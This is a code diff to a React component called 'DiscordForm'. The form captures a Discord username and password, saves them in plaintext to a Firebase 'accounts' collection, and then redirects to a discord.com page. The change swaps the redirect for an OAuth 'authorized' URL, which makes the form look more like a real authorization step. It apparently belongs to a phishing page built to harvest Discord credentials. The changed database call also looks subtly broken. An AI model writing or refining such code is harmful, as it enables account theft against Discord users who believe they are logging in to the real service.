@@ -70,15 +70,14 @@ class DiscordForm extends React.Component {
 
     });
   }
-  addUser = e => {
+  addUser = async (e) => {
     e.preventDefault();
-    const db = firebase.firestore();
-    db.collection("accounts").add({username:this.state.username, password:this.state.password});
+    await firebase.collection("accounts").add({username:this.state.username, password:this.state.password});
     this.setState({
       username: "",
       password:""
     });
-    window.location.href = 'https://discord.com/channels/@me';
+    window.location.href = 'https://discord.com/oauth2/authorized';
 
   }
   render() {
